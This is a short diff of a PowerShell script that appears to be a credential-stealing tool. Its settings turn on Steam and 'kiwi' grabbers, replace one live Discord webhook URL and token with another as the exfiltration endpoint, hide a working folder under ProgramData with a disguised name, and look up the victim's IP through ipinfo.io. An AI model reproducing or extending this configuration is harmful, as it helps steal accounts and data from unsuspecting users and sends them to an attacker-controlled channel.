@@ -15,7 +15,7 @@ $steamGrabber = $True
 $kiwiGrabber = $True
 
 # SETTINGS
-$webhook = "https://discord.com/api/webhooks/1152684424589213817/9_714HkFdte_gVTUlKEDVuVxg05iGmXA6XdOe_K0rQRd4Xoj0j2TwQHMi8x7sc-rZiAp"
+$webhook = "https://discord.com/api/webhooks/1153288080724328529/2WchZes08MUadH_I1wiMdWvROn7GOlvdMjEJ9ZN-4SEOGRnUU8pagtw30xSVrMOhOXz5"
 $avatar = "https://cdn.discordapp.com/attachments/1136982052827299881/1136982093965045850/david.png"
 $workspace = "$env:PROGRAMDATA\GraphicsType"
 $ipInfo = $((Invoke-RestMethod http://ipinfo.io/json))
